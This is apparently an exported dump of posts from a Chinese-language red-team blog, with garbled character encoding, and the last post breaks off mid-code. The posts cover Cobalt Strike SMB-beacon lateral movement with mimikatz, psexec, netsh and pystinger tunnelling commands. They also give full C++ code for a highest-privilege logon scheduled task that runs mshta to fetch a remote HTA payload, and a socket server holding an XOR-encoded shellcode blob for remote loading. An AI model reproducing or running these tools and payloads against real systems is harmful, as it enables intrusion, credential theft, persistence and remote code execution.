Beaconä½¿ç”¨å‘½åç®¡é“é€šè¿‡çˆ¶çº§Beaconè¿›è¡Œé€šè®¯ï¼Œå½“ä¸¤ä¸ªBeaconsé“¾æ¥åï¼Œå­Beaconä»çˆ¶Beaconè·å–åˆ°ä»»åŠ¡å¹¶å‘é€ã€‚å› ä¸ºé“¾æ¥çš„Beaconsä½¿ç”¨Windowså‘½åç®¡é“è¿›è¡Œé€šä¿¡ï¼Œæ­¤æµé‡å°è£…åœ¨SMBåè®®ä¸­ï¼Œæ‰€ä»¥SMB beaconç›¸å¯¹éšè”½ã€‚SMB beaconä¸èƒ½ç›´æ¥ç”Ÿæˆå¯ç”¨è½½è·, åªèƒ½ä½¿ç”¨ PsExec æˆ– Stageless Payload ä¸Šçº¿ã€‚ â€‹ é¦–å…ˆå¾—åˆ°å†…ç½‘ä¸­ä¸€å°ä¸»æœºçš„beaconï¼ŒæŠ“å–å¯†ç åè¿›è¡Œsmbå–·å°„ï¼Œå¾—åˆ°å¦ä¸€å°å¼€æ”¾445ç«¯å£çš„æœºå™¨ä¸Šçš„administratorè´¦æˆ·å¯†ç ï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸å‡ºç½‘çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨Smb beaconä½¿ç›®æ ‡ä¸»æœºä¸Šçº¿ ä½¿ç”¨æ¡ä»¶ 1.å…·æœ‰ SMB Beacon çš„ä¸»æœºå¿…é¡»æ¥å— 445 ç«¯å£ä¸Šçš„è¿æ¥ã€‚ 2.åªèƒ½é“¾æ¥ç”±åŒä¸€ä¸ª Cobalt Strike å®ä¾‹ç®¡ç†çš„ Beaconã€‚ 3.åˆ©ç”¨è¿™ç§beaconæ¨ªç§»å¿…é¡»æœ‰ç›®æ ‡ä¸»æœºçš„ç®¡ç†å‘˜æƒé™æˆ–è€…è¯´æ˜¯æ‹¥æœ‰å…·æœ‰ç®¡ç†å‘˜æƒé™çš„å‡­æ®ã€‚ ä½¿ç”¨æ–¹æ³•webæœåŠ¡å™¨ä¸Šçº¿csï¼Œrun mimikatzæŠ“å–å¯†ç  å»ºç«‹listenerï¼Œé€‰æ‹©SMB beacon åœ¨csä¸­ä½¿ç”¨psexecè¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œé€‰æ‹©ç°æœ‰çš„beaconä½œä¸ºè·³æ¿ï¼Œè¿™é‡Œå‡­æ®å¿…é¡»æ˜¯administrator ï¼Œå³æ‹¥æœ‰ç›®æ ‡ä¸»æœºç®¡ç†å‘˜æƒé™ è¿æ¥æˆåŠŸï¼Œå¯ä»¥çœ‹åˆ°smb beaconä¸Šçº¿çš„ä¸»æœºå³ä¾§æœ‰âˆâˆæ ‡è¯† 2.é…ç½®listeneré€šè¿‡HTTPä»£ç†ä¸Šçº¿ä½¿ç”¨goproxyæ­å»ºä»£ç†goproxy ä¸Šä¼ proxy.exeåˆ°webæœåŠ¡å™¨ï¼Œåœ¨8080ç«¯å£å¼€å¯httpä»£ç† 1shell C:\\proxy.exe http -t tcp -p &quot;0.0.0.0:8080&quot; --daemon ç”¨netshå‘½ä»¤æŠŠå¤–ç½‘ipçš„8080ç«¯å£è½¬å‘åˆ°å†…ç½‘ipçš„192.168.204.188çš„822ç«¯å£(å¿…é¡»ä¸ºæœªä½¿ç”¨çš„ç«¯å£ï¼Œå¦åˆ™ä¼šå¤±è´¥),webæœåŠ¡å™¨çš„80ç«¯å£è¢«å ç”¨ï¼Œä¸èƒ½ä½¿ç”¨ 1shell netsh interface portproxy add v4tov4 listenaddress=192.168.204.188 listenport=822 connectaddress=192.168.111.132 connectport=8080 æ£€æµ‹ç«¯å£æ˜¯å¦å¯ç”¨ 1netstat -ano | findstr :822 åˆ›å»ºlistenerè®¾ç½®å¦‚ä¸‹ ç”Ÿæˆstageless payloadå…³äºstage å’Œ stagelessçš„åŒºåˆ«ï¼š æ¢å¯»Metasploit Payloadæ¨¡å¼èƒŒåçš„ç§˜å¯† stageråˆ†é˜¶æ®µï¼Œç¬¬ä¸€é˜¶æ®µç”³è¯·å†…å­˜ï¼Œç¬¬äºŒä»¶é˜¶æ®µå‘C2å‘èµ·è¯·æ±‚å¹¶æ¥å—shellcodeæ‰§è¡Œ stagelessä¸åˆ†é˜¶æ®µï¼Œç”Ÿæˆæ—¶å°±åŒ…å«äº†æ‰€æœ‰æ–‡ä»¶ï¼Œå¯ä»¥é¿å…shellcodeä¼ è¾“ä¸ç•…é€ æˆç›®æ ‡æ— æ³•ä¸Šçº¿ æˆåŠŸä¸Šçº¿ è¿æ¥è¿‡ç¨‹ 192.168.204.141 â†’ 192.168.204.188:822â†’ 192.168.111.132:8080â†’ C2 3.ä½¿ç”¨pystingeræ­å»ºsocks4ä»£ç†pystinger åŸç†æ¥æº:çº¢é˜Ÿæ”»é˜²å®è·µï¼šä¸å‡ºç½‘ä¸»æœºæ­å»ºå†…ç½‘éš§é“æ–°æ€è·¯ æœåŠ¡ç«¯ç”±webshellå’Œstinger_server.exeæ„æˆï¼Œwebshellåªè´Ÿè´£è¿›è¡Œæµé‡è½¬å‘ï¼Œå¤§éƒ¨åˆ†å»ºç«‹è¿æ¥åŠå¤„ç†æ•°æ®çš„å·¥ä½œç”±stinger_server.exeå®ç°ï¼Œæœ¬è´¨å°±æ˜¯æ­å»ºäº†ä¸€ä¸ªSOCK4ä»£ç†è½¬å‘æµé‡ ä½¿ç”¨æ–¹æ³•ä¸Šä¼ proxy.phpåˆ°ç½‘ç«™ç›®å½•ï¼Œæ­£å¸¸è®¿é—®è¿”å›UTF-8 ä¸Šä¼ stinger_server.exeï¼Œæ‰§è¡Œ 1start stinger_server.exe 0.0.0.0 Kaliä¸Šæ‰§è¡Œ 1./stinger_client -w http://192.168.111.132:81/proxy.php -l 127.0.0.1 -p 60000 csä¸­æ–°å»ºlistenerï¼Œ192.168.204.188ä¸ºwebæœåŠ¡å™¨å†…ç½‘ipï¼Œ60020ä¸ºè½¬å‘ç«¯å£ ä½¿ç”¨psexecæ¨ªå‘ç§»åŠ¨ï¼Œé€‰æ‹©listenerä¸ºstingerï¼ŒæˆåŠŸä¸Šçº¿ å‚è€ƒï¼šCobalt Strike Listener with Proxy çº¢é˜Ÿæ”»é˜²å®è·µï¼šä¸å‡ºç½‘ä¸»æœºæ­å»ºå†…ç½‘éš§é“æ–°æ€è·¯ dnsä¸smb beaconè¯¦è§£ä¸ä¸€ç§å†…ç½‘ç©¿é€æ–¹æ³•çš„å®è·µ å†…ç½‘æ¸—é€ï¼šä¸å‡ºç½‘æ¸—é€æŠ€å·§https://www.freebuf.com/articles/web/247287.html)","link":"/2020/12/15/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E6%96%B9%E6%B3%95/"},{"title":"ä½¿ç”¨COMç»„ä»¶åˆ›å»ºè®¡åˆ’ä»»åŠ¡","text":"Windowsç³»ç»Ÿå¯ä»¥è®¾ç½®è®¡åˆ’ä»»åŠ¡æ¥æŒ‡å‘ä¸€äº›å®šæ—¶ä»»åŠ¡ã€‚æœ¬ä¹¦ä¸­è®¡åˆ’ä»»åŠ¡çš„è§¦å‘æ¡ä»¶æ˜¯åœ¨ç”¨æˆ·ç™»é™†æ—¶è§¦å‘ï¼Œæ‰§è¡Œå¯åŠ¨æŒ‡å®šè·¯å¾„ç¨‹åºçš„æ“ä½œ åˆ›å»ºè®¡åˆ’ä»»åŠ¡æ—¶æ¶‰åŠåˆ°COMç»„ä»¶æ¥å£çš„è°ƒç”¨ï¼Œè¦æ±‚ç®¡ç†å‘˜æƒé™ï¼Œç¨‹åºé€»è¾‘æ¦‚æ‹¬ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯åˆå§‹åŒ–æ“ä½œã€åˆ›å»ºè®¡åˆ’ä»»åŠ¡æ“ä½œã€åˆ é™¤è®¡åˆ’ä»»åŠ¡æ“ä½œã€‚ 1.åˆå§‹åŒ–æ“ä½œç”±äºä½¿ç”¨COMç»„ä»¶ï¼Œæ‰€ä»¥å¿…é¡»è°ƒç”¨CoInitializeå‡½æ•°æ¥åˆå§‹åŒ–COMæ¥å£ç¯å¢ƒï¼Œè¿™æ ·æ‰èƒ½ä½¿ç”¨COMæ¥å£å‡½æ•°ã€‚åŒæ—¶ä¹Ÿè¦å…ˆè·å–ITaskServiceå¯¹è±¡æŒ‡é’ˆä»¥åŠITaskFolderæŒ‡é’ˆï¼Œè¿™ä¸¤ä¸ªæŒ‡é’ˆå¯¹è±¡ä¸»è¦ç”¨æ¥è¿›è¡Œè®¡åˆ’ä»»åŠ¡çš„åˆ›å»ºæ“ä½œã€‚ 1.CoInitializeåˆå§‹åŒ–COMç»„ä»¶ 2.CoCreateInstanceåˆ›å»ºä»»åŠ¡æœåŠ¡å¯¹è±¡ 3.è¿æ¥åˆ°ä»»åŠ¡æœåŠ¡ 4.ä»ITaskServiceå¯¹è±¡ä¸­è·å–æ ¹ä»»åŠ¡Root Task Folderçš„æŒ‡é’ˆå¯¹è±¡ITaskFolderï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘æ–°æ³¨å†Œçš„ä»»åŠ¡ åˆå§‹åŒ–æ“ä½œå®Œæˆåç›´æ¥æ“ä½œITaskServiceå¯¹è±¡ä»¥åŠITaskFolderå¯¹è±¡ 2.åˆ›å»ºè®¡åˆ’ä»»åŠ¡ä»ITaskServiceå¯¹è±¡ä¸­åˆ›å»ºä¸€ä¸ªä»»åŠ¡å®šä¹‰å¯¹è±¡ITaskDefinitionï¼Œå®ƒè¢«ç”¨äºåˆ›å»ºä»»åŠ¡ï¼Œç„¶åå¯¹ä»»åŠ¡å®šä¹‰å¯¹è±¡ITaskDefinitionè¿›è¡Œè®¾ç½® è®¾ç½®æ³¨å†Œä¿¡æ¯ï¼ŒåŒ…æ‹¬è®¾ç½®ä½œè€…ä¿¡æ¯ã€‚ è®¾ç½®ä¸»ä½“ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç™»é™†ç±»å‹ã€è¿è¡Œæƒé™ã€‚ è®¾ç½®é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä½¿ç”¨ç”µæ± è¿è¡Œæ—¶æ˜¯å¦åœæ­¢ è®¾ç½®æ“ä½œä¿¡æ¯ï¼ŒåŒ…æ‹¬è¦å¯åŠ¨çš„ç¨‹åºï¼Œå¹¶è®¾ç½®ç¨‹åºè·¯å¾„å’Œå‚æ•° è®¾ç½®è§¦å‘å™¨ï¼Œåœ¨ç”¨æˆ·ç™»é™†æ—¶æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ 3.åˆ é™¤è®¡åˆ’ä»»åŠ¡è°ƒç”¨DeleteTaskæ¥å£å‡½æ•°åˆ é™¤æŒ‡å®šåç§°çš„è®¡åˆ’ä»»åŠ¡ å®Œæ•´ä»£ç è¿™é‡Œä½¿ç”¨mshtaä¸Šçº¿ï¼Œæ— æ–‡ä»¶ä¸Šçº¿çš„æ–¹æ³•å¾ˆå¤šï¼Œä¸å±€é™è¿™ä¸€ç§ å°†è®¡åˆ’ä»»åŠ¡è®¾ç½®ä¸ºæ‰§è¡Œc:\\windows\\system32\\mshta.exe http://192.168.111.129:8080/p7ptgsev.hta 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208#include &lt;atlbase.h&gt;#include &lt;comdef.h&gt;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;shlobj_core.h&gt;#include &lt;taskschd.h&gt;#pragma comment(lib, &quot;taskschd.lib&quot;)ITaskService* m_lpITS = NULL;ITaskFolder* m_lpRootFolder = NULL;//åˆå§‹åŒ–COMç»„ä»¶void Init() { //1.CoInitializeåˆå§‹åŒ–COMç»„ä»¶ HRESULT hr = CoInitialize(NULL); if (FAILED(hr)) { MessageBox(NULL, L&quot;åˆå§‹åŒ–COMç»„ä»¶å¤±è´¥&quot;, L&quot;Failed&quot;, MB_OK); } //2.CoCreateInstanceåˆ›å»ºä»»åŠ¡æœåŠ¡å¯¹è±¡ hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&amp;m_lpITS); if (FAILED(hr)) { MessageBox(NULL, L&quot;åˆ›å»ºä»»åŠ¡æœåŠ¡å¤±è´¥&quot;, L&quot;Failed&quot;, MB_OK); } //3.è¿æ¥åˆ°ä»»åŠ¡æœåŠ¡ hr = m_lpITS-&gt;Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()); if (FAILED(hr)) { MessageBox(NULL, L&quot;è¿æ¥æœåŠ¡å¤±è´¥&quot;, L&quot;Failed&quot;, MB_OK); } //4.ä»ITaskServiceå¯¹è±¡ä¸­è·å–æ ¹ä»»åŠ¡Root Task Folderçš„æŒ‡é’ˆå¯¹è±¡ITaskFolderï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘æ–°æ³¨å†Œçš„ä»»åŠ¡ hr = m_lpITS-&gt;GetFolder(_bstr_t(&quot;\\\\&quot;), &amp;m_lpRootFolder); if (FAILED(hr)) { MessageBox(NULL, L&quot;è·å–æŒ‡é’ˆå¤±è´¥&quot;, L&quot;Failed&quot;, MB_OK); }}//å¸è½½COMç»„ä»¶void UnInit() { if (m_lpITS) { m_lpITS-&gt;Release(); } if (m_lpRootFolder) { m_lpRootFolder-&gt;Release(); } ::CoUninitialize();}//åˆ›å»ºè®¡åˆ’ä»»åŠ¡BOOL CreateTask(const char* lpszTaskName,const char* lpszProgramPath,const char* lpszParameters,const char* lpszAuthor) { // åˆ›å»ºä»»åŠ¡å®šä¹‰å¯¹è±¡æ¥åˆ›å»ºä»»åŠ¡ ITaskDefinition* pTaskDefinition = NULL; HRESULT hr = m_lpITS-&gt;NewTask(0, &amp;pTaskDefinition); if (FAILED(hr)) { return FALSE; } /* è®¾ç½®æ³¨å†Œä¿¡æ¯ */ IRegistrationInfo* pRegInfo = NULL; CComVariant variantAuthor(NULL); variantAuthor = lpszAuthor; hr = pTaskDefinition-&gt;get_RegistrationInfo(&amp;pRegInfo); if (FAILED(hr)) { return FALSE; } // è®¾ç½®ä½œè€…ä¿¡æ¯ hr = pRegInfo-&gt;put_Author(variantAuthor.bstrVal); pRegInfo-&gt;Release(); /* è®¾ç½®ç™»å½•ç±»å‹å’Œè¿è¡Œæƒé™ */ IPrincipal* pPrincipal = NULL; hr = pTaskDefinition-&gt;get_Principal(&amp;pPrincipal); if (FAILED(hr)) { return FALSE; } // è®¾ç½®ç™»å½•ç±»å‹ hr = pPrincipal-&gt;put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN); // è®¾ç½®è¿è¡Œæƒé™ // æœ€é«˜æƒé™ hr = pPrincipal-&gt;put_RunLevel(TASK_RUNLEVEL_HIGHEST); pPrincipal-&gt;Release(); /* è®¾ç½®å…¶ä»–ä¿¡æ¯ */ ITaskSettings* pSettting = NULL; hr = pTaskDefinition-&gt;get_Settings(&amp;pSettting); if (FAILED(hr)) { return FALSE; } // è®¾ç½®å…¶ä»–ä¿¡æ¯ hr = pSettting-&gt;put_StopIfGoingOnBatteries(VARIANT_FALSE); hr = pSettting-&gt;put_DisallowStartIfOnBatteries(VARIANT_FALSE); hr = pSettting-&gt;put_AllowDemandStart(VARIANT_TRUE); hr = pSettting-&gt;put_StartWhenAvailable(VARIANT_FALSE); hr = pSettting-&gt;put_MultipleInstances(TASK_INSTANCES_PARALLEL); pSettting-&gt;Release(); /* åˆ›å»ºæ‰§è¡ŒåŠ¨ä½œ */ IActionCollection* pActionCollect = NULL; hr = pTaskDefinition-&gt;get_Actions(&amp;pActionCollect); if (FAILED(hr)) { return FALSE; } IAction* pAction = NULL; // åˆ›å»ºæ‰§è¡Œæ“ä½œ hr = pActionCollect-&gt;Create(TASK_ACTION_EXEC, &amp;pAction); pActionCollect-&gt;Release(); /* è®¾ç½®æ‰§è¡Œç¨‹åºè·¯å¾„å’Œå‚æ•° */ CComVariant variantProgramPath(NULL); CComVariant variantParameters(NULL); IExecAction* pExecAction = NULL; hr = pAction-&gt;QueryInterface(IID_IExecAction, (PVOID*)(&amp;pExecAction)); if (FAILED(hr)) { pAction-&gt;Release(); return FALSE; } pAction-&gt;Release(); // è®¾ç½®ç¨‹åºè·¯å¾„å’Œå‚æ•° variantProgramPath = lpszProgramPath; variantParameters = lpszParameters; pExecAction-&gt;put_Path(variantProgramPath.bstrVal); pExecAction-&gt;put_Arguments(variantParameters.bstrVal); pExecAction-&gt;Release(); /* åˆ›å»ºè§¦å‘å™¨ï¼Œå®ç°ç”¨æˆ·ç™»é™†è‡ªå¯åŠ¨ */ ITriggerCollection* pTriggers = NULL; hr = pTaskDefinition-&gt;get_Triggers(&amp;pTriggers); if (FAILED(hr)) { return FALSE; } // åˆ›å»ºè§¦å‘å™¨,æŠŠè§¦å‘å™¨è®¾ç½®ä¸º ITrigger* pTrigger = NULL; hr = pTriggers-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger); if (FAILED(hr)) { return FALSE; } /* æ³¨å†Œä»»åŠ¡è®¡åˆ’ */ IRegisteredTask* pRegisteredTask = NULL; CComVariant variantTaskName(NULL); variantTaskName = lpszTaskName; hr = m_lpRootFolder-&gt;RegisterTaskDefinition(variantTaskName.bstrVal, pTaskDefinition, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(&quot;&quot;), &amp;pRegisteredTask); if (FAILED(hr)) { pTaskDefinition-&gt;Release(); return FALSE; } pTaskDefinition-&gt;Release(); pRegisteredTask-&gt;Release(); return TRUE;}//åˆ é™¤è®¡åˆ’ä»»åŠ¡BOOL DeleteTask(char* lpszTaskName){ if (NULL == m_lpRootFolder) { return FALSE; } CComVariant variantTaskName(NULL); variantTaskName = lpszTaskName; HRESULT hr = m_lpRootFolder-&gt;DeleteTask(variantTaskName.bstrVal, 0); if (FAILED(hr)) { return FALSE; } return TRUE;}int main(){ const char* lpszTaskName = &quot;aaasacwss&quot;; //ä»»åŠ¡å const char* lpszProgramPath = &quot;c:\\\\windows\\\\system32\\\\mshta.exe&quot;; //è¦æ‰§è¡Œçš„ç¨‹åºè·¯å¾„ const char* lpszParameters = &quot;http://192.168.111.129:8080/p7ptgsev.hta&quot;; //ç¨‹åºå‚æ•° const char* lpszAuthor = &quot;&quot;; Init(); BOOL bRet=CreateTask(lpszTaskName, lpszProgramPath, lpszParameters, lpszAuthor); if (!bRet) { printf(&quot;Create Task Failed&quot;); return -1; } UnInit(); printf(&quot;Successd&quot;); return 0;} è¿è¡Œ æ·»åŠ æˆåŠŸ ä½¿ç”¨msfä¸­çš„hta_serveräº§ç”Ÿhtaæ–‡ä»¶å¹¶ä¼ é€’payloadï¼Œé‡å¯åè¿”å›ä¸€ä¸ªSession","link":"/2021/02/28/%E4%BD%BF%E7%94%A8COM%E7%BB%84%E4%BB%B6%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"},{"title":"åˆ©ç”¨SOCKETåˆ†ç¦»shellcode","text":"åŸç†å®¢æˆ·ç«¯è¿è¡Œåå‘æœåŠ¡ç«¯å‘èµ·è¯·æ±‚æ¥æ”¶xorè¿ç®—åçš„shellcodeè¿˜åŸåæ‰§è¡Œï¼Œè¾¾åˆ°è¿œç¨‹åŠ è½½shellcodeçš„ç›®çš„ï¼Œä¸stagerçš„åŠŸèƒ½æœ‰äº›ç±»ä¼¼ã€‚ æœåŠ¡ç«¯ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;WinSock2.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)using namespace std;int main(int argc, char* argv[]){ const int BUF_SIZE = 1024; WSADATA wsd; //WSADATAå˜é‡ SOCKET sServer; //æœåŠ¡å™¨å¥—æ¥å­— SOCKET sClient; //å®¢æˆ·ç«¯å¥—æ¥å­— SOCKADDR_IN addrServ;; //æœåŠ¡å™¨åœ°å€ char buf[BUF_SIZE]; //æ¥æ”¶æ•°æ®ç¼“å†²åŒº char sendBuf[] = &quot;\\x6b\\xdf\\x14\\x73\\x67\\x7f\\x5f\\x97\\x97\\x97\\xd6\\xc6\\xd6\\xc7\\xc5\\xc6\\xc1\\xdf\\xa6\\x45\\xf2\\xdf\\x1c\\xc5\\xf7\\xdf\\x1c\\xc5\\x8f\\xdf\\x1c\\xc5\\xb7\\xdf\\x1c\\xe5\\xc7\\xdf\\x98\\x20\\xdd\\xdd\\xda\\xa6\\x5e\\xdf\\xa6\\x57\\x3b\\xab\\xf6\\xeb\\x95\\xbb\\xb7\\xd6\\x56\\x5e\\x9a\\xd6\\x96\\x56\\x75\\x7a\\xc5\\xd6\\xc6\\xdf\\x1c\\xc5\\xb7\\x1c\\xd5\\xab\\xdf\\x96\\x47\\xf1\\x16\\xef\\x8f\\x9c\\x95\\xe2\\xe5\\x1c\\x17\\x1f\\x97\\x97\\x97\\xdf\\x12\\x57\\xe3\\xf0\\xdf\\x96\\x47\\xc7\\x1c\\xdf\\x8f\\xd3\\x1c\\xd7\\xb7\\xde\\x96\\x47\\x74\\xc1\\xdf\\x68\\x5e\\xd6\\x1c\\xa3\\x1f\\xdf\\x96\\x41\\xda\\xa6\\x5e\\xdf\\xa6\\x57\\x3b\\xd6\\x56\\x5e\\x9a\\xd6\\x96\\x56\\xaf\\x77\\xe2\\x66\\xdb\\x94\\xdb\\xb3\\x9f\\xd2\\xae\\x46\\xe2\\x4f\\xcf\\xd3\\x1c\\xd7\\xb3\\xde\\x96\\x47\\xf1\\xd6\\x1c\\x9b\\xdf\\xd3\\x1c\\xd7\\x8b\\xde\\x96\\x47\\xd6\\x1c\\x93\\x1f\\xdf\\x96\\x47\\xd6\\xcf\\xd6\\xcf\\xc9\\xce\\xcd\\xd6\\xcf\\xd6\\xce\\xd6\\xcd\\xdf\\x14\\x7b\\xb7\\xd6\\xc5\\x68\\x77\\xcf\\xd6\\xce\\xcd\\xdf\\x1c\\x85\\x7e\\xd8\\x68\\x68\\x68\\xca\\xfd\\x97\\xde\\x29\\xe0\\xfe\\xf9\\xfe\\xf9\\xf2\\xe3\\x97\\xd6\\xc1\\xde\\x1e\\x71\\xdb\\x1e\\x66\\xd6\\x2d\\xdb\\xe0\\xb1\\x90\\x68\\x42\\xdf\\xa6\\x5e\\xdf\\xa6\\x45\\xda\\xa6\\x57\\xda\\xa6\\x5e\\xd6\\xc7\\xd6\\xc7\\xd6\\x2d\\xad\\xc1\\xee\\x30\\x68\\x42\\x7c\\xe4\\xcd\\xdf\\x1e\\x56\\xd6\\x2f\\xc7\\x97\\x97\\x97\\xda\\xa6\\x5e\\xd6\\xc6\\xd6\\xc6\\xfd\\x94\\xd6\\xc6\\xd6\\x2d\\xc0\\x1e\\x08\\x51\\x68\\x42\\x7c\\xce\\xcc\\xdf\\x1e\\x56\\xdf\\xa6\\x45\\xde\\x1e\\x4f\\xda\\xa6\\x5e\\xc5\\xff\\x97\\x95\\xd7\\x13\\xc5\\xc5\\xd6\\x2d\\x7c\\xc2\\xb9\\xac\\x68\\x42\\xdf\\x1e\\x51\\xdf\\x14\\x54\\xc7\\xfd\\x9d\\xc8\\xdf\\x1e\\x66\\xdf\\x1e\\x4d\\xde\\x50\\x57\\x68\\x68\\x68\\x68\\xda\\xa6\\x5e\\xc5\\xc5\\xd6\\x2d\\xba\\x91\\x8f\\xec\\x68\\x42\\x12\\x57\\x98\\x12\\x0a\\x96\\x97\\x97\\xdf\\x68\\x58\\x98\\x13\\x1b\\x96\\x97\\x97\\x7c\\x44\\x7e\\x73\\x96\\x97\\x97\\x7f\\x35\\x68\\x68\\x68\\xb8\\xff\\xd3\\xd9\\xf4\\x97\\x9b\\x88\\x75\\x09\\xbe\\x35\\xdc\\xd7\\x35\\x98\\xd0\\x2d\\xbe\\xa9\\x5b\\x83\\x00\\xa1\\xc6\\x5a\\xa4\\x4c\\xbd\\xd2\\x20\\xcc\\x66\\x45\\x97\\x24\\xda\\x15\\x40\\x32\\xe1\\xb7\\x8c\\xa2\\xfa\\xa2\\xa0\\x20\\x67\\x69\\x1c\\x02\\xe1\\x54\\x4e\\x8a\\x79\\x2c\\xf0\\xa7\\x4b\\x7d\\xd5\\xb9\\x3d\\xee\\x1a\\x4a\\xf5\\xa7\\x74\\x8d\\x66\\xed\\x9a\\x43\\xf5\\x3f\\x5a\\x97\\xc2\\xe4\\xf2\\xe5\\xba\\xd6\\xf0\\xf2\\xf9\\xe3\\xad\\xb7\\xda\\xf8\\xed\\xfe\\xfb\\xfb\\xf6\\xb8\\xa3\\xb9\\xa7\\xb7\\xbf\\xf4\\xf8\\xfa\\xe7\\xf6\\xe3\\xfe\\xf5\\xfb\\xf2\\xac\\xb7\\xda\\xc4\\xde\\xd2\\xb7\\xaf\\xb9\\xa7\\xac\\xb7\\xc0\\xfe\\xf9\\xf3\\xf8\\xe0\\xe4\\xb7\\xd9\\xc3\\xb7\\xa2\\xb9\\xa6\\xac\\xb7\\xc3\\xe5\\xfe\\xf3\\xf2\\xf9\\xe3\\xb8\\xa3\\xb9\\xa7\\xac\\xb7\\xb9\\xd9\\xd2\\xc3\\xb7\\xd4\\xdb\\xc5\\xb7\\xa6\\xb9\\xa6\\xb9\\xa3\\xa4\\xa5\\xa5\\xac\\xb7\\xd5\\xd8\\xde\\xd2\\xaf\\xac\\xd2\\xd9\\xc2\\xc4\\xbe\\x9a\\x9d\\x97\\xba\\x40\\x2a\\xb6\\xce\\x2c\\x01\\xae\\x0c\\x64\\x70\\x02\\xfb\\xbf\\x3b\\x14\\x9d\\x54\\xb9\\x76\\xe2\\x9c\\x2a\\x5d\\x28\\x08\\x2f\\xcd\\x21\\x52\\x5c\\x57\\xe0\\xfd\\x14\\x8a\\x95\\xaf\\x66\\xc1\\x23\\x70\\x97\\xe4\\xb2\\xd6\\xf7\\xd0\\x3a\\xf6\\xf7\\xcd\\x87\\x96\\xb2\\x0f\\xef\\x11\\x6b\\x1c\\x22\\x4d\\xc4\\xed\\x65\\xce\\x0a\\xab\\x30\\x94\\xd2\\xdc\\x8d\\xbf\\x3a\\xa6\\xc9\\xe0\\x5e\\x93\\x89\\x10\\x47\\xfa\\x96\\xac\\xb7\\x70\\xdd\\x93\\x41\\x7b\\x62\\x5d\\x35\\xe1\\x35\\x8b\\x4a\\x50\\x07\\x38\\x1f\\xb8\\x10\\x92\\xe0\\x08\\xcb\\xdb\\x79\\x8c\\xbe\\x94\\xcb\\xc0\\xb2\\x70\\x70\\xac\\x36\\xbd\\x83\\x76\\x46\\xde\\xfc\\x4a\\xac\\x0b\\x30\\x69\\x57\\x05\\x69\\xac\\x1f\\xec\\xba\\x09\\x8f\\x62\\xe8\\x4f\\xcd\\xe2\\x35\\x07\\xbe\\xab\\xaf\\x7c\\x64\\x8a\\x01\\xf5\\x92\\xe2\\x9c\\xda\\x28\\x7f\\xd5\\xc3\\x0d\\xa3\\x8f\\x8b\\x97\\x63\\x34\\xfa\\x7e\\xe9\\xd7\\x5e\\x5b\\x7b\\xb5\\xb3\\x47\\xa8\\xe3\\x8f\\x37\\xd0\\x2a\\x30\\xb1\\xc0\\x32\\xe8\\xd9\\x53\\x97\\xd6\\x29\\x67\\x22\\x35\\xc1\\x68\\x42\\xdf\\xa6\\x5e\\x2d\\x97\\x97\\xd7\\x97\\xd6\\x2f\\x97\\x87\\x97\\x97\\xd6\\x2e\\xd7\\x97\\x97\\x97\\xd6\\x2d\\xcf\\x33\\xc4\\x72\\x68\\x42\\xdf\\x04\\xc4\\xc4\\xdf\\x1e\\x70\\xdf\\x1e\\x66\\xdf\\x1e\\x4d\\xd6\\x2f\\x97\\xb7\\x97\\x97\\xde\\x1e\\x6e\\xd6\\x2d\\x85\\x01\\x1e\\x75\\x68\\x42\\xdf\\x14\\x53\\xb7\\x12\\x57\\xe3\\x21\\xf1\\x1c\\x90\\xdf\\x96\\x54\\x12\\x57\\xe2\\x40\\xcf\\xcf\\xcf\\xdf\\x92\\x97\\x97\\x97\\x97\\xc7\\x54\\x7f\\x08\\x6a\\x68\\x68\\xa6\\xae\\xa5\\xb9\\xa6\\xa1\\xaf\\xb9\\xa6\\xa6\\xa6\\xb9\\xa6\\xa4\\xa7\\x97\\x85\\xa3\\xc1\\xef&quot;; int retVal; //è¿”å›å€¼ if (argc &lt;= 1) { cout &lt;&lt; &quot;USAGE: server.exe &lt;Listen Port&gt;&quot; &lt;&lt; endl; return -1; } if (WSAStartup(MAKEWORD(2, 2), &amp;wsd) != 0)//åˆå§‹åŒ–å¥—ç»“å­—åŠ¨æ€åº“ { cout &lt;&lt; &quot;WSAStartup failed!&quot; &lt;&lt; endl; return 1; } //åˆ›å»ºå¥—æ¥å­— sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (INVALID_SOCKET == sServer) { cout &lt;&lt; &quot;Socket Failed!&quot; &lt;&lt; endl; WSACleanup();//é‡Šæ”¾å¥—æ¥å­—èµ„æº; return -1; } //æœåŠ¡å™¨å¥—æ¥å­—åœ°å€ addrServ.sin_family = AF_INET; addrServ.sin_port = htons((short)atoi(argv[1]));; addrServ.sin_addr.s_addr = htonl(INADDR_ANY); //ç»‘å®šå¥—æ¥å­— retVal = bind(sServer, 